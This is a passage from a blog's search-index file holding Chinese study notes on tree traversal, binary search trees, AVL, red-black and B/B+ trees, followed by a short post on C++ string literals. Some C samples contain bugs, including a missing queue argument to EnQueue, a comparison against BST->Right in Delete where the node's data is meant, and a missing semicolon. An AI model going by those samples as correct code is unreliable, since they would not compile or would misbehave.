title="中序遍历非递归遍历算法"></a>中序遍历非递归遍历算法</h4><p>基本思路：使用&#x3D;&#x3D;栈&#x3D;&#x3D;</p><ul><li>遇到一个结点，就把它压栈，并去遍历它的左子树</li><li>当左子树遍历结束后，从栈顶弹出这个结点并访问它；</li><li>然后按其右指针再去中序遍历该结点的右子树</li></ul><p>代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrderTraversal</span><span class="params">(BinTree BT)</span></span><br><span class="line">&#123;</span><br><span class="line">BinTree T = BT;</span><br><span class="line">    Stack S = CreateStack(MaxSize);</span><br><span class="line">    <span class="keyword">while</span>(T || !IsEmpty(S))&#123;  <span class="comment">//当T = NULL时开始处理栈顶元素</span></span><br><span class="line"><span class="keyword">while</span>(T)&#123;   <span class="comment">//一直向左将沿途结点压入堆栈</span></span><br><span class="line">            Push(S, T);</span><br><span class="line">            T = T-&gt;Left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!IsEmpty(S))&#123;  </span><br><span class="line">            T = Pop(S);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,T-&gt;Data);</span><br><span class="line">            T = T-&gt;Right;  <span class="comment">//左边走完了，看看右边有没有</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4><p>二叉树遍历的核心问题：二位结构的线性化</p><ul><li><p>从结点访问其左右儿子结点</p></li><li><p>访问做儿子后，右儿子结点怎么办？</p><p>需要一个存储结构保存暂时不访问的结点</p><p>存储结构：堆栈、队列</p></li><li><p>队列实现：遍历从根结点开始，首先将根结点入队，然后开始执行循环：结点出队、访问该该结点、将其左右儿子入队<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/10.png" alt="00"></p></li></ul><p>代码示例:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">LevelOrderTraversal</span><span class="params">(BinTree BT)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!BT)<span class="keyword">return</span>; <span class="comment">//若是空树则直接返回</span></span><br><span class="line">    Queue Q = CreateQueue(MaxSize);</span><br><span class="line">    BinTree T;</span><br><span class="line">    EnQueue(Q, BT);</span><br><span class="line">    <span class="keyword">while</span>(!IsEmpty(Q))&#123;</span><br><span class="line">T = DeQueue(Q);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, T-&gt;Data);</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;Left)EnQueue(T-&gt;Left);</span><br><span class="line">        <span class="keyword">if</span>(T-&gt;Right)EnQueue(T-&gt;Right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="遍历应用例子"><a href="#遍历应用例子" class="headerlink" title="遍历应用例子"></a>遍历应用例子</h4><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/11.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/12.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/13.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/14.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/15.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/16.png" alt="00"></p><hr><h4 id="什么是二叉搜索树"><a href="#什么是二叉搜索树" class="headerlink" title="什么是二叉搜索树"></a>什么是二叉搜索树</h4><p>二叉搜索树（BST， Binary Search Tree）,也称二叉排序树或二叉查找树</p><p>二叉搜索树：一棵二叉树，可以为空；如果不为空，满足以下性质：</p><ol><li>非空左子树的所有键值小于其根结点的键值</li><li>非空右子树的所有键值大于其根结点的键值</li><li>左、右子树都是二叉搜索树</li></ol><h4 id="二叉搜索树操作的特别函数"><a href="#二叉搜索树操作的特别函数" class="headerlink" title="二叉搜索树操作的特别函数"></a>二叉搜索树操作的特别函数</h4><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/17.png" alt="00"></p><p>Find</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Position <span class="title function_">Find</span><span class="params">(ElementType X, BinTree BST)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!BST) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(X == BST-&gt;Data)&#123;</span><br><span class="line">        <span class="keyword">return</span> BST;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(X &lt; BST-&gt;Data)&#123;</span><br><span class="line">        <span class="keyword">return</span> Find(X, BST-&gt;Left);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Find(X, BST-&gt;Right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/18.png" alt="00"></p><p>Insert</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">Insert</span><span class="params">(ElementType X, BinTree BST)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!BST)&#123;</span><br><span class="line">        Position BT = (Position)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> TreeNode));</span><br><span class="line">        BT-&gt;Data = X;</span><br><span class="line">        BT-&gt;Left = BT-&gt;Right = <span class="literal">NULL</span>;</span><br><span class="line">        BST = BT;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(X &lt; BST-&gt;Data)&#123;</span><br><span class="line">        BST-&gt;Left = Insert(X, BST-&gt;Left);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        BST-&gt;Right = Insert(X, BST-&gt;Right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> BST;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二叉搜索树的删除</p><p>考虑三种情况：</p><ul><li><p>删除叶结点：直接删除，并修改其父结点指针—置为NULL</p></li><li><p>删除的结点只有一个子结点：将其父结点的指针指向要删除结点的孩子结点，用被删除结点的孩子顶替被删除结点<br><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/19.png" alt="00"></p></li><li><p>删除的结点有左、右两棵子树：</p><p>用另一结点代替被删结点：&#x3D;&#x3D;右子树&#x3D;&#x3D;的&#x3D;&#x3D;最小&#x3D;&#x3D;元素 或者 &#x3D;&#x3D;左子树&#x3D;&#x3D;的&#x3D;&#x3D;最大&#x3D;&#x3D;元素</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/20.png" alt="00"></p></li></ul><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/21.png" alt="00"></p><p>Delete</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">BinTree <span class="title function_">Delete</span><span class="params">(ElementType X, BinTree BST)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(BST == <span class="literal">NULL</span>)<span class="built_in">printf</span>(<span class="string">&quot;未找到删除元素&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(X &lt; BST-&gt;Data)&#123;</span><br><span class="line">        BST-&gt;Left = Delete(X, BST-&gt;Left);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(X &gt; BST-&gt;Right)&#123;</span><br><span class="line">BST-&gt;Right = Delete(X, BST-&gt;Right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(BST-&gt;Left &amp;&amp; BST-&gt;Right)&#123;</span><br><span class="line">            Position T = FindMin(BST-&gt;Right)<span class="comment">//查找右子树最小元素</span></span><br><span class="line">            BST-&gt;Data = T-&gt;Data;</span><br><span class="line">            BST-&gt;Right = Delete(T-&gt;Data, BST-&gt;Right); <span class="comment">//将问题转化为情况一或情况二</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="comment">//被删除结点有一个或无子结点</span></span><br><span class="line">            Position T = BST;</span><br><span class="line">            <span class="keyword">if</span>(BST-&gt;Left)&#123;</span><br><span class="line">                 BST = BST-&gt;Left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(BST-&gt;Right)&#123;</span><br><span class="line">                 BST = BST-&gt;Right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                BST = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">free</span>(T);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> BST;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><p>平衡因子(Balanced Factor，简称BF)：BF(T) &#x3D; h<del>L</del> - h<del>R</del>，<br>其中 h<del>L</del>，h<del>R</del>，分别为T的左、右子树的高度.<br>&#x3D;&#x3D;平衡二叉树&#x3D;&#x3D;<br>空树u，或者<br>任一左右子树高度差的绝对值不超过1，即|BF(T)| &lt;&#x3D; 1</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/22.png" alt="00"></p><p>平衡二叉树的高度</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/24.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/24.png" alt="00"></p><p>####平衡二叉树的调整</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/25.png" alt="00"></p><p>不平衡的“发现者”是Mar,”破坏者”Nov在发现者右子树的右边，因而叫&#x3D;&#x3D;RR插入&#x3D;&#x3D;，需要&#x3D;&#x3D;RR旋转（右单旋）&#x3D;&#x3D;</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/26.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/27.png" alt="00"></p><p>不平衡的“发现者”是Mar,”破坏者”Apr在发现者左子树的左边，因而叫&#x3D;&#x3D;LL插入&#x3D;&#x3D;，需要&#x3D;&#x3D;LL旋转（左单旋）&#x3D;&#x3D;</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/28.png" alt="00"></p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/29.png" alt="00"></p><p>不平衡的“发现者”是May,”破坏者”Jan在发现者左子树的右边，因而叫&#x3D;&#x3D;LR插入&#x3D;&#x3D;，需要&#x3D;&#x3D;LR旋转&#x3D;&#x3D;</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/30.png" alt="00"></p><p>RL旋转</p><p><img src="/../posts_img/%E6%B5%99%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%91/31.png" alt="00"></p><h3 id="平衡二叉树的删除操作步骤"><a href="#平衡二叉树的删除操作步骤" class="headerlink" title="平衡二叉树的删除操作步骤"></a>平衡二叉树的删除操作步骤</h3><ol><li>删除要删除的结点，方法同 <strong>二叉排序树的输出</strong> 一样，有三类情况<ul><li>叶子结点</li><li>只有一个子树的结点</li><li>有左右子树的结点</li></ul></li><li>从被删除的结点开始向上找最小不平衡子树（不平衡的<strong>发现者</strong>），注意如果被删除的结点是<strong>有左右子树的结点</strong>，则从实际被删除的那个“替罪羊”开始找。如果没有找到，那说明没有不平衡的情况</li><li><u>从<strong>发现者</strong>开始</u>，找它高度最高的儿子，以及其高度最高的孙子</li><li><u>高度度最高的孙子作为**“破坏者“<strong></u>，根据</strong>发现者<strong>和</strong>破坏者**的位置关系来确定调整关系（LL、RR、LR、RL）</li><li>从被调整的最小不平衡字数开始，继续向上找最小不平衡字数，重复2的步骤。</li></ol><h3 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h3><p><strong>二叉搜索树</strong>，为实现 O(log n) 的查找效率提供了思路，但是二叉搜索树的效率不稳定，如果插入顺序不对，就会使得查找效率又变为 O(n)</p><p>于是有了 <strong>平衡二叉树(AVL)</strong>，平衡二叉树是二叉搜索树的升级版，它的旋转操作在每次插入操作后保证了树的高度控制在 O(log n) 级别，换句话说，平衡二叉树就是会自我调节高度的二叉搜索树</p><p>但由于  <strong>平衡二叉树(AVL)</strong> 对树的高度太过严格（任一结点左右子树高度相差不大于1），导致其在插入过程中旋转操作太过频繁，使得插入和删除的效率太低。</p><p>于是有了 <strong>红黑树</strong>，也是一颗<strong>二叉搜索树</strong>，它与<strong>平衡二叉树</strong>一样，都是具有特殊要求的<strong>二叉搜索树</strong>。</p><p><strong>红黑树</strong>对树的高度要求不像<strong>平衡二叉树</strong>那样严格，因此其<strong>查找效率</strong>略逊于 <strong>平衡二叉树</strong>。</p><p>但是<strong>红黑树</strong>在<strong>插入和删除</strong>操作时的旋转调整次数少于<strong>平衡二叉树</strong>，所以它的插入和删除效率更高。</p><p>红黑树定义：</p><ol><li>首先是一棵二叉搜索树，即左子树都小于根结点，右子树都大于根结点</li><li>根结点是黑色的</li><li>所有叶子结点（其实是NULL结点）是黑色的</li><li>所有红色结点的孩子都是黑色的，换句话说，从上到下，不存在连续的两个红色结点</li><li>任一结点到任一叶子结点的路径上，黑色结点的数量相同（路径上黑色结点不包括起点，但包括终端叶结点）。<br> 是同一起点不同终点的路径上数量相等，不是说任意起点到任意终点的路径上数量都相等</li></ol><p>红黑树的插入操作：</p><p>插入的结点如果是黑色，会破坏 <strong>黑路同</strong> 的性质，因此默认插入的颜色是红色。虽然也可能会破坏 <strong>不红红</strong> 的性质，但相比来说破坏程度更小</p><ol><li>插入红色结点，无非破坏的就是 <strong>根叶黑</strong> 与 <strong>不红红</strong> 的性质。<ol><li>插入结点是根结点，破坏 <strong>根叶黑</strong> 性质，直接改为黑色即可</li><li>破坏的 <strong>不红红</strong> 的性质，那么插入结点的父结点一定是红色，且爷爷结点一定是黑色，（红-红-黑）<br> 那么怎么调整就要看叔叔结点的颜色<ol><li>如果叔叔节点是红色，<br> 父结点肯定要变成黑色，导致分支的黑色增加，那可以使另外一个分支，叔叔结点也变成黑色<br> 上面两个操作使得小整体的黑色增加，那就爷爷结点变成红色减少小整体的黑色，<br> 这又引发 <strong>根叶黑</strong> 或 <strong>不红红</strong> 的问题，那么就以爷爷结点为新插入结点，从头开始继续判定。<br> 那么操作很简单，<strong>父结点、爷爷结点、叔叔结点</strong> 三个结点都变色（颜色取反）；然后以爷爷结点为插入结点（cur），从最开始的第一步继续判定 cur 结点是否违反了 <strong>根叶黑</strong> 或 **不红红 **的性质。</li><li>如果叔叔结点是黑色，不能增加叔叔分支的黑色<br> 那就只能旋转，改变树形结构<br> 怎么旋转还是按照平衡二叉树的旋转方法来<br> 旋转后肯定是红色结点为新的父结点，结构为（R&lt;-R-&gt;B）<br> 这样肯定不满足 <strong>黑路同</strong><br> 为了使两个分支黑色相等有两个选择（B&lt;-R-&gt;B）和 （R&lt;-B-&gt;R）<br> （B&lt;-R-&gt;B）会引发新的  <strong>根叶黑</strong> 或 **不红红 ** 问题<br> 所以选择 （R&lt;-B-&gt;R）<br> 反正记住新的父结点肯定要变色，剩下的让两边颜色对称就好了</li></ol></li></ol></li></ol><blockquote><p>从来没记过四种旋转<img src="https://i0.hdslb.com/bfs/emote/c3043ba94babf824dea03ce500d0e73763bf4f40.png@40w_40h.avif" alt="[笑哭]">按我直观的感觉就是把涉及到的三个节点中间大小的做父亲节点，然后多出来的子树按照大小接到空余的位置就行了，以不变应万法。红黑树的变色也是因为需要符合其性质不得不这么操作：对于插入节点违反“不红红”的情况，显然祖父-&gt;父亲-&gt;插入节点一定构成黑(B)-红(R)-红(R)的形式，显然需要把某个红节点变黑。由于默认插入红结点，所以我们只能把父亲节点变黑。变黑会导致祖父-&gt;父亲这一路的树黑节点数+1，违反“黑路同”原则。所以我们必须想办法让另一路，也就是祖父-叔叔这一路的树黑节点数也+1。①如果叔叔节点是红的，那刚好就让他变黑。但是这还没完，注意到祖父节点为根的子树整体黑节点数+1了，这跟祖父节点的兄弟节点引导的子树违反“黑路同”原则，所以还得把祖父节点变红，平衡黑节点数。祖父节点变红后，等效于新插入了这个节点，所以重复判定即可。②如果叔叔节点是黑的，无法+1，那就只能旋转树，重新排列，把黑色的祖父节点安排到叔叔节点的那一路。同时因为祖父节点一定是三个节点中最小或最大的，不可能作为新的父亲节点，所以新父亲节点一定是红的（R&lt;-R-&gt;B），原祖父节点(B)必然在原叔叔那一路。显然左右子树黑节点数量不一样的，新父节点变黑，黑子节点变红即可解决（R&lt;-B-&gt;R）。说这么多就是想说这玩意不用背，记住红黑树的性质就可以推导出来<img src="https://i0.hdslb.com/bfs/emote/c3043ba94babf824dea03ce500d0e73763bf4f40.png@40w_40h.avif" alt="[笑哭]"></p></blockquote><h3 id="B-树"><a href="#B-树" class="headerlink" title="B-树"></a>B-树</h3><p>B树也是一种排序树，但不是二叉的排序树，它是多叉的</p><p>AVL树与红黑树虽然效率很高，但是它们所占用的内存很大，而且当数据量很大不得不存放在硬盘当中时，因为只有二叉的原因树高会非常高，使得查找次数很高。所以当数据量非常大的时候，二叉的排序树反而没有优势</p><p>因此有了B树这种多叉的排序树</p><p>不同教材对B树的叶子结点不一样，可以是最后一层结点，也可能以是NULL结点</p><p>下面的叶子结点指的是最后一层结点，NULL结点就叫NULL结点</p><p>B树的三个特点：</p><ol><li>平衡：为了达到像平衡二叉树那种左右平衡的效果，使得B树不会变成只有一边很长，另一边很短的样子，所有叶结点（不是NULL结点）都必须在同一层，即规定任何一个结点，其所有子树（包括NULL结点）的高度都要相同</li><li>有序：一个结点不止包含一个元素，结点内有序。任一元素的左子树都小于它，右子树都大于它</li><li>多路：也就是多叉，但是最多有几叉，最少有几叉都是有规定的<br> 对于 m 阶B树来说：<br> 一个结点<strong>最多</strong>有m个分支，有m个分支也就代表最多 m -1 个元素<br> 根节点<strong>最少</strong>有2个分支，1个元素<br> 其它结点（包括叶结点）<strong>最少</strong>要有 ⌈ m&#x2F;2 ⌉ 个分支，即最少要有 ⌈ m&#x2F;2 ⌉-1 个结点<br> 比如 5阶 B树，最多有 5 个分支 4 个结点<br> 除根结点允许只有 2 个分支 1 个结点外，其它结点必须至少有 3 个分支，2个结点</li></ol><p>B树的插入：</p><ol><li>B树的插入都是找好位置，插入叶结点中的</li><li>插入到叶结点后，如果元素个数超过了最大个数，m - 1 + 1 也就是 m 个元素，就需要做分裂操作</li><li>选中该结点的中间元素，即第 ⌈ m&#x2F;2 ⌉ 个元素，该元素沿着天线飞升至上一层结点，然后天线分裂到飞升后元素位置的两边，原来结点根据原来被选中元素的位置分裂成左右两棵子树，分别挂在分裂的两个天线上</li><li>飞升后的结点的元素个数如果也超过了最大个数，即达到了 m 个元素，则重复刚才操作直至符合B树要求</li></ol><p>B树的删除：</p><ol><li>如果删除的是分支结点中元素，则从它的叶子结点中找到从数值上最靠近它的左右两个元素，选择一个覆盖它，然后删除那个叶子结点上的元素。所以最终都会归结到删除叶子结点上元素的问题</li><li>如果删除的是叶子结点上的元素，由于 B树要求每个结点至少有 ⌈ m&#x2F;2 ⌉-1 个元素，因此如果元素删除后，叶子结点中的元素个数小于这个数造成下溢，就要做处理</li><li>首先不管三七二十一，先从父结点上选择一个方向拽一个元素下来，然后看对应方向上的左右兄弟的元素个数够不够分一个出来，顶替原先父结点的元素</li><li>如果够的话，很好，让一个正确的元素飞升上去，顶替原来父结点的位置</li><li>如果不够的话，则只能进行合并处理，连带上刚刚拽下来的父结点的元素，选择对应方向上的兄弟结点合并</li></ol><h3 id="B-树-1"><a href="#B-树-1" class="headerlink" title="B+树"></a>B+树</h3><p>B树虽然存储起来很方便，在查找某一个数据的时候也很方便，但如果需要遍历每一个数据的时候就会非常麻烦，需要用中序遍历在结点之间来回穿梭，非常耗时</p><p>B+树作为数据库的数据结构，在B树的基础上做了改进。</p><p>它的核心只需要记住几点（主要是前面2条，后面几条是想到什么写什么的）：</p><ol><li>与B树不同的是，它的关键数据都存放在叶子结点上，也就是说所有的叶子节点上就存放了所有数据<br> 而其它非叶子结点不存在关键数据，它们仅仅只是作为查找关键数据的方向，或者说索引。非叶子结点中的元素存放的是其指向的下一层的结点中的值最大的元素</li><li>与B树不同的是，B树结点的元素数等于指针数-1（因为指针分布在元素的空隙及其两侧），而B+树的元素数是等于指针数的（也就是说其指针是位于元素的正下方的）。举个例子，同样是 5 阶树，B树最多允许5叉4个元素，最少允许3叉2个元素；而B+树却允许5叉5个元素，最少允许3叉3个元素。</li><li>B+树与B树一样，也要让所有NULL结点处在同一层</li><li>因为B+树的所有数据都在叶子结点上了，所以可以通过一个指针一连串的顺序读取叶子结点读出所有元素</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++中字符串字面量</title>
      <link href="/2023/02/05/C++%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E9%9D%A2%E9%87%8F/"/>
      <url>/2023/02/05/C++%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E9%9D%A2%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="C-中字符串字面量"><a href="#C-中字符串字面量" class="headerlink" title="C++中字符串字面量"></a>C++中字符串字面量</h3><ul><li><p>在C&#x2F;C++中用双引号括起来的字符序列就叫做字符串字面量,如<u>“abc”</u></p></li><li><p>在C++中字符串字面量的本质就是 &#x3D;&#x3D;const char[] 类型&#x3D;&#x3D;,如”hello”就是const char[6]型<br>在必要的时候，可以将字符串字面量转化为 &#x3D;&#x3D;const char*类型&#x3D;&#x3D;的指针,该指针指向字符串的首字符<br>所以,C++的字符串字面量是不允许被修改的,且指针赋值时也必须有规定</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span>* str = <span class="string">&quot;hello&quot;</span>; <span class="comment">//这样赋值才对</span></span><br><span class="line"><span class="type">char</span>* str = <span class="string">&quot;hello&quot;</span>; <span class="comment">//报错</span></span><br></pre></td></tr></table></figure></li><li><p>但是,C中的字符串字面的的本质是 &#x3D;&#x3D;char[] 类型&#x3D;&#x3D; ,也就是说理论上C的字符串字面量是   可以被修改的，但这是&#x3D;&#x3D;未定义行为&#x3D;&#x3D;,一旦由此操作程序或许会崩溃</p></li></ul><p>​      下面以”hello”为例</p><ul><li>“hello”是数组类型的左值，且是不可被修改的左值,也就是说&amp;”hello”是合法的</li><li>“hello”在必要时可以转化为指针,等同于 &amp;(“hello”[0])</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, <span class="string">&quot;hello&quot;</span>);<span class="comment">//00007ff6295f9000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;<span class="string">&quot;hello&quot;</span>);<span class="comment">//00007ff6295f9000</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, *<span class="string">&quot;hello&quot;</span>);<span class="comment">//h</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, <span class="string">&quot;hello&quot;</span>[<span class="number">0</span>]);<span class="comment">//h</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, *(<span class="string">&quot;hello&quot;</span><span class="number">+1</span>));<span class="comment">//e</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* p = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p的地址:%p,p指向%p&quot;</span>, &amp;p, p);<span class="comment">//p的地址:00000008813ffdc8</span></span><br><span class="line">                                       <span class="comment">//p指向00007ff6295f9000</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，因为数组类型左值无法修改,所以 “hello” +&#x3D; 1 是不允许的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[] = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里的”hello”是作为左值使用来为s数组赋初值,所以不会转化为指针，所以s是独立的并不会指向”hello”的地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
